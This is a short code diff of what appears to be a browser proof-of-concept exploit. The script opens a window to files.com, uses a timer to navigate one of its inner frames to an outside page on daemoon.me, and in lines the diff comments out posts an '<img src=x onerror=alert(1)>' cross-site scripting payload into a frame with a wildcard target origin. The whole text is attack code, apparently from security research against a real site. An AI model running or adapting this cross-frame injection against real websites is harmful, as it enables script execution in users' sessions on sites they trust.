@@ -45,12 +45,12 @@
             let w = window.open("https://www.files.com/", "_blank", "width=500,height=500");
             setTimeout(() => {
                 // Navigate inner iframe
-                w.frames[0].location = "https://daemoon.me/alert.html";
+                w.frames[1].location = "https://daemoon.me/alert.html";
             }, 2000);
-            setTimeout(() => {
-                // Post message to inner iframe
-                w.frames[0].postMessage("<img src=x onerror=alert(1)>", '*');
-            }, 2500);
+            // setTimeout(() => {
+            //     // Post message to inner iframe
+            //     w.frames[0].postMessage("<img src=x onerror=alert(1)>", '*');
+            // }, 2500);
         }
     </script>
 
